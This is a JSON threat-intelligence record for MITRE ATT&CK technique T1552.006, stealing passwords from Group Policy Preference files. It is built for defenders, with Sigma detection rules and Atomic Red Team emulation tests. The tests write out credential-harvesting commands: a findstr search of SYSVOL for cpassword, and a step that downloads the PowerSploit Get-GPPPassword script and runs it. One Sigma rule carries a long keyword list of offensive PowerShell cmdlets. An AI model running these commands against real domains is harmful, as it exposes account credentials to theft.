{
    "id": "T1552.006",
    "name": "Group Policy Preferences",
    "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n* Metasploit’s post exploitation module: `post/windows/gather/credentials/gpp`\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: `dir /s * .xml`",
    "platforms": "Windows",
    "kill_chain_phases": "Credential Access",
    "data_sources": "File: File Access, Command: Command Execution",
    "detection": "Monitor for attempts to access SYSVOL that involve searching for XML files.\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)",
    "url": "https://attack.mitre.org/techniques/T1552/006",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1552.006",
                "atomic_attack_guid": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
                "atomic_attack_name": "GPP Passwords (findstr)",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Password Reconnaissance Via Findstr.EXE",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_findstr_password_recon.yml",
                        "remote_content": "title: Potential Password Reconnaissance Via Findstr.EXE\nid: 1a0f6f16-2099-4753-9a02-43b6ac7a1fa5\nstatus: test\ndescription: Detects command line usage of \"findstr\" to search for the \"passwords\" keyword in a variety of different languages\nreferences:\n    - https://steflan-security.com/windows-privilege-escalation-credential-harvesting/\n    - https://adsecurity.org/?p=2288\nauthor: Josh Nickels\ndate: 2023-05-18\ntags:\n    - attack.credential-access\n    - attack.t1552.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\findstr.exe'\n        - OriginalFileName: 'FINDSTR.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'contraseña' # Spanish\n            - 'hasło' # Polish\n            - 'heslo' # Czech\n            - 'parola' # Italian\n            - 'passe' # French\n            - 'passw' # German, English\n            - 'senha' # Portuguese\n            - 'senord' # Swedish\n            - '密碼' # Cantonese\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Findstr GPP Passwords",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_findstr_gpp_passwords.yml",
                        "remote_content": "title: Findstr GPP Passwords\nid: 91a2c315-9ee6-4052-a853-6f6a8238f90d\nstatus: test\ndescription: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-11-11\ntags:\n    - attack.credential-access\n    - attack.t1552.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\find.exe'\n              - '\\findstr.exe'\n        - OriginalFileName:\n              - 'FIND.EXE'\n              - 'FINDSTR.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'cpassword'\n            - '\\sysvol\\'\n            - '.xml'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows Password Managers Discovery",
                        "rule_link": "https://research.splunk.com/endpoint/a3b3bc96-1c4f-4eba-8218-027cac739a48/"
                    },
                    {
                        "rule_name": "Windows Findstr GPP Discovery",
                        "rule_link": "https://research.splunk.com/endpoint/1631ac2d-f2a9-42fa-8a59-d6e210d472f5/"
                    }
                ]
            },
            {
                "tech_id": "T1552.006",
                "atomic_attack_guid": "e9584f82-322c-474a-b831-940fd8b4455c",
                "atomic_attack_name": "GPP Passwords (Get-GPPPassword)",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "8d7bd4f5-3a89-4453-9c82-2c8894d5655e",
                    "fe63010f-8823-4864-a96b-a7b4a0f7b929",
                    "05f3c945-dcc8-4393-9f3d-af65077a8f86",
                    "47e4bab7-c626-47dc-967b-255608c9a920",
                    "91a2c315-9ee6-4052-a853-6f6a8238f90d"
                ],
                "lookup_results": [
                    {
                        "uuid": "8d7bd4f5-3a89-4453-9c82-2c8894d5655e",
                        "lookup_data": {
                            "mitre-attack-id": "T1552.006",
                            "mitre-cti:description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\n\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\n",
                            "mitre-cti:name": "Group Policy Preferences",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e', 'type': 'attack-pattern', 'created': '2020-02-11T18:43:06.253Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1552.006', 'url': 'https://attack.mitre.org/techniques/T1552/006'}, {'source_name': 'Microsoft GPP 2016', 'url': 'https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)', 'description': 'Microsoft. (2016, August 31). Group Policy Preferences. Retrieved March 9, 2020.'}, {'url': 'https://msdn.microsoft.com/library/cc422924.aspx', 'description': 'Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018.', 'source_name': 'Microsoft GPP Key'}, {'url': 'https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html', 'description': 'Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018.', 'source_name': 'Obscuresecurity Get-GPPPassword'}, {'description': 'Sean Metcalf. (2015, December 28). Finding Passwords in SYSVOL & Exploiting Group Policy Preferences. Retrieved February 17, 2020.', 'url': 'https://adsecurity.org/?p=2288', 'source_name': 'ADSecurity Finding Passwords in SYSVOL'}], 'modified': '2020-06-17T14:25:38.082Z', 'name': 'Group Policy Preferences', 'description': 'Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\\n\\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\\n\\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\\n\\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\\n* gpprefdecrypt.py\\n\\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\\n', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Monitor for attempts to access SYSVOL that involve searching for XML files. \\n\\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'File: File Access'], 'x_mitre_permissions_required': ['User']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
                        "lookup_data": {
                            "description": "Detects findstring commands that include the keyword lsass, which indicates recon actviity for the LSASS process PID",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/08/12\ndescription: Detects findstring commands that include the keyword lsass, which indicates\n  recon actviity for the LSASS process PID\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains: lsass\n    Image|endswith: \\findstr.exe\n  selection2:\n    CommandLine|contains:\n    - ' /i lsass.exe'\n    - ' /i \"lsass'\n    - findstr lsass\n    - findstr.exe lsass\n    - findstr \"lsass\n    - findstr.exe \"lsass\nfalsepositives:\n- Unknown\nid: fe63010f-8823-4864-a96b-a7b4a0f7b929\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1552.006\ntitle: Findstr LSASS\n",
                            "sigma:id": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
                            "title": "Findstr LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "05f3c945-dcc8-4393-9f3d-af65077a8f86",
                        "lookup_data": {
                            "description": "Detects Access to Domain Group Policies stored in SYSVOL",
                            "raw": "author: Markus Neis, Jonhnathan Ribeiro, oscd.community\ndate: 2018/04/09\ndescription: Detects Access to Domain Group Policies stored in SYSVOL\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - \\SYSVOL\\\n    - \\policies\\\nfalsepositives:\n- Administrative activity\nid: 05f3c945-dcc8-4393-9f3d-af65077a8f86\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://adsecurity.org/?p=2288\n- https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.006\ntitle: Suspicious SYSVOL Domain Group Policy Access\n",
                            "sigma:id": "05f3c945-dcc8-4393-9f3d-af65077a8f86",
                            "title": "Suspicious SYSVOL Domain Group Policy Access",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "47e4bab7-c626-47dc-967b-255608c9a920",
                        "lookup_data": {
                            "description": "Detects usage of findstr with the \"EVERYONE\" keyword. This is often used in combination with icacls to look for misconfigured files or folders permissions",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/08/12\ndescription: Detects usage of findstr with the \"EVERYONE\" keyword. This is often used\n  in combination with icacls to look for misconfigured files or folders permissions\ndetection:\n  condition: all of selection_findstr_* or selection_special\n  selection_findstr_cli:\n    CommandLine|contains:\n    - '\"Everyone\"'\n    - '''Everyone'''\n  selection_findstr_img:\n    Image|endswith: \\findstr.exe\n    OriginalFileName: FINDSTR.EXE\n  selection_special:\n    CommandLine|contains|all:\n    - 'icacls '\n    - 'findstr '\n    - Everyone\nfalsepositives:\n- Unknown\nid: 47e4bab7-c626-47dc-967b-255608c9a920\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1552.006\ntitle: Suspicious Recon Activity Using Findstr Keywords\n",
                            "sigma:id": "47e4bab7-c626-47dc-967b-255608c9a920",
                            "title": "Suspicious Recon Activity Using Findstr Keywords",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "91a2c315-9ee6-4052-a853-6f6a8238f90d",
                        "lookup_data": {
                            "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt.",
                            "raw": "author: frack113\ndate: 2021/12/27\ndescription: Look for the encrypted cpassword value within Group Policy Preference\n  files on the Domain Controller. This value can be decrypted with gpp-decrypt.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - cpassword\n    - \\sysvol\\\n    - .xml\n    Image|endswith: \\findstr.exe\nfalsepositives:\n- Unknown\nid: 91a2c315-9ee6-4052-a853-6f6a8238f90d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.006/T1552.006.md#atomic-test-1---gpp-passwords-findstr\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1552.006\ntitle: Findstr GPP Passwords\n",
                            "sigma:id": "91a2c315-9ee6-4052-a853-6f6a8238f90d",
                            "title": "Findstr GPP Passwords",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1552.006",
                "display_name": "Unsecured Credentials: Group Policy Preferences",
                "atomic_tests": [
                    {
                        "name": "GPP Passwords (findstr)",
                        "auto_generated_guid": "870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f",
                        "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Computer must be domain joined\n",
                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
                            }
                        ],
                        "executor": {
                            "command": "findstr /S cpassword %logonserver%\\sysvol\\*.xml\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "GPP Passwords (Get-GPPPassword)",
                        "auto_generated_guid": "e9584f82-322c-474a-b831-940fd8b4455c",
                        "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "gpp_script_url": {
                                "description": "URL of the Get-GPPPassword PowerShell Script",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1"
                            },
                            "gpp_script_path": {
                                "description": "Path to the Get-GPPPassword PowerShell Script",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}\n",
                                "prereq_command": "if(Test-Path \"#{gpp_script_path}\") {exit 0 } else {exit 1 }\n",
                                "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{gpp_script_path}\") -Force | Out-Null\nInvoke-WebRequest #{gpp_script_url} -OutFile \"#{gpp_script_path}\"\n"
                            },
                            {
                                "description": "Computer must be domain joined\n",
                                "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"
                            }
                        ],
                        "executor": {
                            "command": ". \"#{gpp_script_path}\"\nGet-GPPPassword -Verbose\n",
                            "name": "powershell"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 16:04:26"
}